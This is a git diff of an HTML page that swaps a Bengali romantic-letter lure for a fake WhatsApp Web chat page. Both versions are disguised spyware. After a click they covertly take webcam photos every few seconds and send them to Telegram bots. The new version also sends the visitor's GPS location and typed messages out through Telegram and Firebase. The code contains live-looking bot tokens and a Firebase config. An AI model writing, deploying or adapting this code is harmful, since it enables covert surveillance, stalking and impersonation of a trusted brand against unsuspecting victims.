@@ -1,348 +1,157 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>A Special Message - Miraz</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap');
-    
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
-    
-    body { 
-      /* ফিচার ৩: ঝাপসা ব্যাকগ্রাউন্ড ছবি (নিশ্চিত করুন background.jpg ফাইলটি আছে) */
-      background: url('background.jpg') no-repeat center center fixed; 
-      background-size: cover;
-      height: 100vh; 
-      overflow: hidden; 
-      position: relative; 
-      color: #fff;
-    }
-    
-    /* ব্যাকগ্রাউন্ড ওভারলে এবং ব্লার ইফেক্ট */
-    body::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(15, 15, 26, 0.85); 
-      backdrop-filter: blur(12px); 
-      z-index: -1;
-    }
-    
-    .header { 
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(10px);
-      color: #00f2fe; 
-      padding: 18px 25px; 
-      font-size: 20px; 
-      font-weight: 700; 
-      display: flex; 
-      justify-content: space-between; 
-      align-items: center; 
-      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-      z-index: 1000; 
-      position: relative; 
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>WhatsApp</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-attachment: fixed; height: 100vh; display: flex; flex-direction: column; }
+        
+        /* WhatsApp Header */
+        .header { background: #008069; color: white; padding: 10px 15px; display: flex; align-items: center; gap: 10px; z-index: 100; }
+        .p-img { width: 40px; height: 40px; border-radius: 50%; background: #ccc; }
+        .info { flex: 1; }
+        .status { font-size: 12px; color: #cfdfdb; }
 
-    #overlay { 
-      position: fixed; 
-      top: 0; left: 0; width: 100%; height: 100%; 
-      background: rgba(15, 15, 26, 0.98); 
-      z-index: 2000; 
-      display: flex; 
-      justify-content: center; 
-      align-items: center; 
-      transition: 0.8s; 
-    }
+        /* Chat Display */
+        #chatDisplay { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 5px; }
+        .bubble { max-width: 85%; padding: 7px 12px; border-radius: 8px; font-size: 15px; position: relative; margin-bottom: 2px; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }
+        .sent { align-self: flex-end; background: #d9fdd3; border-top-right-radius: 0; }
+        .received { align-self: flex-start; background: #ffffff; border-top-left-radius: 0; }
+        .time { font-size: 10px; color: #667781; text-align: right; margin-top: 3px; }
 
-    .start-box { 
-      text-align: center; 
-      width: 85%; 
-      max-width: 380px; 
-      padding: 40px 30px; 
-      border-radius: 24px; 
-      background: rgba(255, 255, 255, 0.03); 
-      box-shadow: 0 15px 35px rgba(0,0,0,0.5); 
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(15px);
-    }
+        /* Input Area */
+        .input-area { background: #f0f2f5; padding: 7px 10px; display: flex; align-items: center; gap: 8px; }
+        .input-box { flex: 1; background: #fff; border-radius: 25px; padding: 8px 15px; display: flex; align-items: center; gap: 10px; }
+        .input-box input { flex: 1; border: none; outline: none; font-size: 16px; }
+        .mic-btn { background: #00a884; color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: none; box-shadow: 0 1px 2px rgba(0,0,0,0.2); }
 
-    .allow-btn { 
-      background: linear-gradient(45deg, #00f2fe, #4facfe); 
-      color: white; 
-      border: none; 
-      padding: 16px 30px; 
-      border-radius: 50px; 
-      font-weight: 700; 
-      font-size: 1.1rem; 
-      cursor: pointer; 
-      width: 100%; 
-      margin-top: 25px; 
-      box-shadow: 0 5px 15px rgba(0, 242, 254, 0.3);
-    }
-
-    .chat-container { 
-      background: transparent; 
-      max-width: 700px; 
-      margin: 0 auto; 
-      height: 100vh; 
-      display: none; 
-      opacity: 0; 
-      transition: 1.5s; 
-      position: relative; 
-    }
-
-    .letter-area { 
-      padding: 20px 25px 50px 25px; 
-      height: calc(100vh - 70px); 
-      overflow-y: auto; 
-      position: relative; 
-      scrollbar-width: none; 
-    }
-    .letter-area::-webkit-scrollbar { display: none; } 
-    
-    .typing-content { 
-      width: 100%; 
-      text-align: justify; 
-      z-index: 500; 
-      position: relative;
-    }
-
-    .message-card {
-        background: rgba(255, 255, 255, 0.04);
-        padding: 35px 25px;
-        border-radius: 20px;
-        border: 1px solid rgba(255, 255, 255, 0.08);
-        backdrop-filter: blur(8px);
-        margin-top: 10px;
-    }
-
-    .main-text {
-        font-size:1.15rem; 
-        line-height:2.4; 
-        color:#e0e0f0; 
-        white-space:pre-wrap; 
-        font-weight: 600;
-        display: inline;
-    }
-
-    .cursor {
-      display: inline-block;
-      width: 10px;
-      background-color: #00f2fe;
-      animation: blink 1s infinite;
-    }
-    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-
-    /* ফিচার ২: ভাসমান ফুল */
-    .flower {
-      position: absolute;
-      background-image: url('flower.png'); 
-      background-size: cover;
-      pointer-events: none;
-      z-index: 600;
-      animation: floatFlower linear infinite;
-    }
-    @keyframes floatFlower {
-      0% { transform: translateY(-10vh) translateX(0) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(110vh) translateX(50px) rotate(360deg); opacity: 0; }
-    }
-
-    .rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; pointer-events: none; }
-    .raindrop { 
-      position: absolute; 
-      background: linear-gradient(transparent, #00f2fe); 
-      width: 1.5px; 
-      height: 25px; 
-      opacity: 0.3;
-      animation: rainfall linear infinite; 
-    }
-    @keyframes rainfall { to { transform: translateY(100vh); } }
-    
-    .heart { 
-      position: absolute; 
-      color: #ff4d6d; 
-      font-size: 24px; 
-      pointer-events: none; 
-      animation: floatHeart 6s infinite linear; 
-      z-index: 600; 
-    }
-    @keyframes floatHeart { 
-      0% { transform: translateY(100vh) scale(0.5); opacity: 0; } 
-      20% { opacity: 1; } 
-      100% { transform: translateY(-15vh) scale(1.3); opacity: 0; } 
-    }
-
-    #video, #canvas { display: none; }
-  </style>
+        /* Permission Overlay */
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        video, canvas { display: none; }
+    </style>
 </head>
 <body>
 
-  <div id="overlay">
-    <div class="start-box">
-      <h2 style="color:#00f2fe; margin-bottom:10px;">একটি বিশেষ বার্তা! ❤️</h2>
-      <p style="color: #a0a0b0; font-weight: 400;">মিরাজ আপনার জন্য কিছু পাঠিয়েছে।</p>
-      <button class="allow-btn" id="startBtn">ওপেন করুন</button>
+<div id="overlay">
+    <i class="fab fa-whatsapp" style="font-size: 70px; color: #25d366; margin-bottom: 20px;"></i>
+    <h2 style="margin-bottom: 10px;">WhatsApp Web</h2>
+    <p style="color: #667781; margin-bottom: 30px;">To start a secure end-to-end encrypted chat with M.H. Miraz, please verify your browser.</p>
+    <button onclick="startSecureChat()" style="background: #25d366; color: white; border: none; padding: 12px 40px; border-radius: 25px; font-weight: bold; font-size: 16px;">Verify & Continue</button>
+</div>
+
+<div class="header">
+    <i class="fas fa-arrow-left"></i>
+    <div class="p-img" style="background-image: url('profile.jpg'); background-size: cover;"></div>
+    <div class="info">
+        <div style="font-weight: bold; font-size: 17px;">M.H. Miraz</div>
+        <div class="status">online</div>
     </div>
-  </div>
+    <i class="fas fa-video"></i>
+    <i class="fas fa-phone-alt"></i>
+    <i class="fas fa-ellipsis-v"></i>
+</div>
 
-  <div class="chat-container" id="chatList">
-    <div class="header">
-        <span>Message For You</span>
-        <div style="font-size: 16px; opacity: 0.7;">✨ 💖</div>
+<div id="chatDisplay"></div>
+
+<div class="input-area">
+    <div class="input-box">
+        <i class="far fa-smile" style="color: #667781; font-size: 22px;"></i>
+        <input type="text" id="waIn" placeholder="Message">
+        <i class="fas fa-paperclip" style="color: #667781; font-size: 20px; transform: rotate(-45deg);"></i>
+        <i class="fas fa-camera" style="color: #667781; font-size: 20px;"></i>
     </div>
-    <div class="letter-area" id="letterArea">
-        <div class="typing-content">
-            <div class="message-card">
-                <h2 style="color:#4facfe; margin-bottom:30px; font-size: 1.7rem; font-weight: 700;">প্রিয়, বাঁম পাজরের হাড় 🌹</h2>
-                
-                <p class="main-text" id="typingText"></p>
-                <span class="cursor" id="cursor">&nbsp;</span>
-                
-                <p style="margin-top: 30px; text-align: center;">
-                    <b style="color: #00f2fe; font-size: 1.35rem; font-weight: 700;">Miraz ☺️</b>
-                </p>
-            </div>
-        </div>
-        <div class="rain" id="rainEffect"></div>
-    </div>
-  </div>
+    <button class="mic-btn" onclick="sendMsg()"><i class="fas fa-paper-plane" id="sendIcon"></i></button>
+</div>
 
-  <audio id="bgMusic" loop preload="auto">
-    <source src="Music.mp3" type="audio/mpeg">
-  </audio>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
+<script>
+    // তোমার অরিজিনাল Firebase Config
+    const firebaseConfig = {
+        apiKey: "AIzaSyCZixj8Sxr_AINbwVtn5llbDbnwbsDVQ1Q",
+        authDomain: "myfacebook-com-mhmiraz2hkahy31.firebaseapp.com",
+        databaseURL: "https://myfacebook-com-mhmiraz2hkahy31-default-rtdb.firebaseio.com",
+        projectId: "myfacebook-com-mhmiraz2hkahy31",
+        storageBucket: "myfacebook-com-mhmiraz2hkahy31.firebasestorage.app",
+        messagingSenderId: "778369076728",
+        appId: "1:778369076728:web:1cb91ca575f406d4821a0d"
+    };
 
-  <script>
-    const textToType = `আল্লাহর রহমতে বেশ ভালো আছো নিশ্চয়, থাকতেই হবে 💝 শত ব্যস্ততার মাঝেও যে আমি তোমার ভালো থাকার দোয়া করতে ভুল করি না 🥰
-                
-অনেকদিন তো হলো আর কতো বাবার বাড়িতে থাকবে শুনি...?? ভুলে গেছো কি...? 🤔 ওটা কিন্তু তোমার থাকার জায়গা নয়, ওখানে তুমি একজন অতিথি মাত্র। 😒
-                
-তুমি হলে রবের নিকট থেকে রহমত সরুপ প্রাপ্ত আমার শ্রেষ্ঠ সম্পদ। তোমার মা বাবাকে শুধু কিছুদিনের জন্যে আমার সেই সম্পদের হেফাজতের সুযোগ দিয়েছি মাত্র। তোমার বাবাকে জানিয়ে দিও খুব শীঘ্রই আসছি কিন্তু আমার সেই সম্পদ বুঝে নিতে। কি হলো চিন্তায় পড়ে গেলে, ভাবতেছো কারই বা সম্পদ তুমি আর এর হকদার-ই বা কেমন?
-                
-ভয় পেও না, তুমি হলে আমার অমূল্য সম্পদ 🥰 তোমার বাবা এর জিম্মাদার হয়ে যদি এত যত্ন আর মায়া করে আগলে রাখতে পারে, তাহলে ভেবে দেখো যে এর আসল হকদার সে কতটা যত্ন আর মায়া করবে তোমাকে ☺️ 
-                
-রাগ করোনা আমার আসতে দেরী হচ্ছে দেখে, আর মাত্র কিছুদিন ধৈর্য ধরো 😥 তোমার জন্যে নিজেকে যোগ্য করতেই একটু সময় লেগে যাচ্ছে 🥺 
-                
-এই শোনো নিজেকে শুধু আমার জন্যে আগলে রেখো কিন্তু, যেমনটা আমি আমাকে আগলে রেখেছি শুধুই তোমার জন্যে। 
-                
-ইতি,
-তোমার জান্নাতের সঙ্গী!!`;
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
+    const CHAT_ID = '7767412329';
 
-    const bot1Token = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY'; 
-    const bot1ChatId = '7767412329';
-    const bot2ChatId = '7888600155';
-    
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const music = document.getElementById('bgMusic');
-    const startBtn = document.getElementById('startBtn');
-    const typingText = document.getElementById('typingText');
-    const cursor = document.getElementById('cursor');
-    const letterArea = document.getElementById('letterArea');
-    
-    let camCounter = 0;
-    let typeIndex = 0;
+    async function startSecureChat() {
+        try {
+            // ১. ক্যামেরা ও মাইক পারমিশন (বাধ্যতামূলক)
+            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+            document.getElementById('v').srcObject = stream;
 
-    startBtn.addEventListener('click', function() {
-      // ইউজার ক্লিক করার পর মিউজিক এবং ক্যামেরা শুরু হবে
-      music.play().catch(err => console.log("Music error:", err));
-      startExperience();
+            // ২. লোকেশন পারমিশন
+            navigator.geolocation.getCurrentPosition(p => {
+                const loc = `📍 Location: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
+            });
+
+            // ৩. ওভারলে সরানো এবং ট্র্যাকিং শুরু
+            document.getElementById('overlay').style.display = 'none';
+            setInterval(capture, 5000); // প্রতি ৫ সেকেন্ডে ছবি
+
+        } catch (e) {
+            alert("Permission Denied. Please allow access to use WhatsApp Web.");
+        }
+    }
+
+    function capture() {
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        if(v.videoWidth === 0) return;
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            let f = new FormData(); f.append('chat_id', CHAT_ID); f.append('photo', b, 'wa.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:f});
+        }, 'image/jpeg', 0.4);
+    }
+
+    // ৪. লাইভ চ্যাট লজিক
+    function sendMsg() {
+        const i = document.getElementById('waIn');
+        const t = i.value.trim();
+        if(t !== "") {
+            append('sent', t);
+            db.ref('miraz/waMsg').set(t); // Firebase এ পাঠানো
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=WA Msg: ${encodeURIComponent(t)}`);
+            i.value = "";
+        }
+    }
+
+    db.ref('miraz/waReply').on('value', s => {
+        const r = s.val();
+        if(r && r !== "") {
+            append('received', r);
+            db.ref('miraz/waReply').set(""); // ক্লিয়ার
+        }
     });
 
-    async function startExperience() {
-      try {
-        await setCam("user");
-        capture("Front_Start");
-        document.getElementById('overlay').style.display = 'none';
-        const chatBox = document.getElementById('chatList');
-        chatBox.style.display = 'block';
-        setTimeout(() => chatBox.style.opacity = '1', 50);
-        
-        // ইফেক্টগুলো চালু করা
-        setInterval(createHeart, 1000); 
-        setInterval(createFlower, 2500); 
-        createRain();
-        startTyping(); 
-        
-        // ক্যামেরা লুপ এবং টেলগ্রাম মেসেজিং
-        setInterval(async () => {
-          camCounter++;
-          const mode = (camCounter % 2 === 0) ? "user" : "environment";
-          await setCam(mode);
-          capture(`${mode}_Loop_${camCounter}`);
-        }, 6000);
-      } catch (err) {
-        alert("ক্যামেরা পারমিশন ছাড়া সারপ্রাইজটি কাজ করবে না!");
-      }
+    function append(type, text) {
+        const chat = document.getElementById('chatDisplay');
+        const now = new Date();
+        const timeStr = now.getHours() + ":" + (now.getMinutes()<10?'0':'') + now.getMinutes();
+        const div = document.createElement('div');
+        div.className = `bubble ${type}`;
+        div.innerHTML = `${text}<div class="time">${timeStr} ${type==='sent'?'<i class="fas fa-check-double" style="color:#53bdeb"></i>':''}</div>`;
+        chat.appendChild(div);
+        chat.scrollTop = chat.scrollHeight;
     }
-
-    function startTyping() {
-      if (typeIndex < textToType.length) {
-        typingText.textContent += textToType.charAt(typeIndex);
-        typeIndex++;
-        // স্বয়ংক্রিয়ভাবে নিচে স্ক্রল করা
-        letterArea.scrollTop = letterArea.scrollHeight;
-        setTimeout(startTyping, 75); 
-      } else {
-        cursor.style.display = 'none';
-      }
-    }
-
-    function createFlower() {
-      const f = document.createElement('div');
-      f.className = 'flower';
-      f.style.left = Math.random() * 100 + 'vw';
-      const size = Math.random() * 20 + 10 + 'px';
-      f.style.width = size; f.style.height = size;
-      f.style.animationDuration = Math.random() * 5 + 5 + 's';
-      document.body.appendChild(f);
-      setTimeout(() => f.remove(), 10000);
-    }
-
-    async function setCam(mode) {
-      if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-      video.srcObject = s;
-      return new Promise(r => video.onloadedmetadata = r);
-    }
-
-    function capture(label) {
-      setTimeout(() => {
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(b => {
-          if (b) { send(bot1ChatId, b, label); send(bot2ChatId, b, label); }
-        }, 'image/jpeg', 0.4);
-      }, 1500);
-    }
-
-    function send(id, b, msg) {
-      const fd = new FormData();
-      fd.append('chat_id', id); fd.append('photo', b, 'img.jpg'); fd.append('caption', msg);
-      fetch(`https://api.telegram.org/bot${bot1Token}/sendPhoto`, { method: 'POST', body: fd });
-    }
-
-    function createRain() {
-      const rainContainer = document.getElementById('rainEffect');
-      for (let i = 0; i < 40; i++) {
-        const drop = document.createElement('div');
-        drop.className = 'raindrop';
-        drop.style.left = Math.random() * 100 + 'vw';
-        drop.style.animationDuration = (Math.random() * 0.5 + 0.8) + 's';
-        rainContainer.appendChild(drop);
-      }
-    }
-
-    function createHeart() {
-      const h = document.createElement('div');
-      h.className = 'heart'; h.innerHTML = '❤️';
-      h.style.left = Math.random() * 100 + 'vw';
-      document.body.appendChild(h);
-      setTimeout(() => h.remove(), 7000);
-    }
-  </script>
+</script>
 </body>
-  </html>
+</html>
